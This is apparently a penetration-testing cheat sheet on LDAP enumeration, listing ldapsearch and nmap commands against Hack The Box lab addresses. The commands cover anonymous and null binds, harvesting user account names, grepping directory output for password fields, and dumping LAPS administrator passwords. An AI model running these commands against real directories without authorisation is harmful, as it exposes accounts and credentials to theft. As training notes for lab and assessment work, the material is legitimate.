# LDAP

### anonymous authentication&#x20;

If server accepts anonymous authentication

{% code overflow="wrap" %}
```bash
# get naming contexts
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
# gets all attributes
ldapsearch -x -H 'ldap://10.10.10.161:389' -b "dc=htb,dc=local" "*" #i.e. domain = htb.local
# find user accounts
ldapsearch -x -H 'ldap://10.10.10.161:389' -b "dc=htb,dc=local" "objectclass=user"
# get possible username
ldapsearch -x -H 'ldap://10.10.10.161:389' -b "dc=htb,dc=local" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F ": " '{print $2}'
# dump LAPS passwords
ldapsearch -D user@htb.local -w PASSWORD -o ldif-wrap=no -b 'dc=htb,dc=local' -H 'ldap://10.10.10.161:389' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
{% endcode %}

search LDAP with admin account

{% code overflow="wrap" %}
```bash
ldapsearch -x -H 'ldap://10.10.10.10:389' -D User -w P@ssw0rd123 -b "dc=htb,dc=local"
```
{% endcode %}

```
nmap -n -sV --script "ldap* and not brute" -p389,3268 192.168.105.122
```

### null bind

```
ldapsearch -x -H 'ldap://192.168.105.122:389' -D '' -w '' -b "DC=domain,DC=local"
ldapsearch -x -H 'ldap://10.10.10.182:389' -D '' -w '' -b "DC=domain,DC=local" | grep Pwd
ldapsearch -x -H 'ldap://10.10.10.182:389' -D '' -w '' -b "DC=domain,DC=local" | grep pass
# make a list of existing users
ldapsearch -x -H 'ldap://10.10.10.172:389' -D '' -w '' -b "DC=DOMAIN,DC=LOCAL" | grep sAMAccountName | tr -d ':' | sed 's/s//' | sed 's/A//' | sed 's/M//' | sed 's/A//'| sed 's/c//' | sed 's/c//'| sed 's/o//' | sed 's/u//' | sed 's/n//'| sed 's/t//' | sed 's/N//'| sed 's/a//' | sed 's/m//' | sed 's/e//' > ldapusers.txt
```

### authenticated

```
ldapsearch -H ldap://10.10.10.248 -x -W -D "user@domain.local" -b "dc=domain,dc=local"
```

## Resources

{% embed url="https://vk9-sec.com/enumerating-ad-users-with-ldap/" %}

{% embed url="https://infinitelogins.com/2020/12/09/enumerating-ldap-port-389/" %}

{% embed url="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/" %}
